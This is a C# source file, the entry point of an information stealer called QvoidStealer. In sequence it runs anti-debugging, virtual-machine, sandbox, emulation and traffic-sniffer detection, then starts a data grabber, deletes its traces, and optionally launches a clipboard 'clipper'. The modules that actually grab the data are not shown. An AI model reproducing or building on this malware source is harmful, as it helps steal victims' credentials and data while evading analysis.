using QvoidStealer.Main;
using QvoidWrapper;
using System;
using System.Globalization;
using System.Threading;

namespace QvoidStealer
{
    internal static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            var mainThread = new Thread(() =>
            {
                Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;
                Thread.CurrentThread.CurrentUICulture = CultureInfo.InvariantCulture;

                Console.WriteLine(@"https://sir_I_am_illusioning_or_you_reading_me?_");

                Protection.WebSniffers(Settings.AntiWebSinffers);
                Protection.AntiDebug(Settings.AntiDebug);
                Protection.DetectVM(Settings.AntiVM);
                Protection.Sandboxie(Settings.AntiSandBoxie);
                Protection.Emulation(Settings.AntiEmulation);

                Grabber.Initialize(args);
                Grabber.DeleteTraces(false, false);

                if (Settings.Clipper.Enabled)
                    Settings.Clipper.Start();

                Environment.Exit(0);
            });
            mainThread.SetApartmentState(ApartmentState.STA);
            mainThread.Start();

            Thread.Sleep(-1);
        }
    }
}
